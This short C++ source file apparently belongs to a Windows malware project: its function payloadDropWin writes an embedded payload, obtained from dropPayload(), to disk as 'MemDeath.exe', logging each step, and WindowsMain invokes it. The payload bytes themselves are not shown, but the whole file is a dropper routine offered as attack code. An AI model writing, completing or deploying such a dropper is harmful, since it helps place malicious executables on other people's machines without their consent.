#include "WindowsAttack.h"
#include "FilesWin.h"
#include <iostream>
int payloadDropWin(){
	try{
		std::ofstream filedrop;
		std::cout << "Opening file" << std::endl;
		filedrop.open("MemDeath.exe", std::ios::binary);
		std::cout << "Dropping payload" << std::endl;
		filedrop << dropPayload();
		std::cout << "Payload dropped, ending drop." << std::endl;
		filedrop.close();
	}catch(std::exception e){
		return 1;
	}
	return 0;
}
void WindowsMain(){
	payloadDropWin();
}
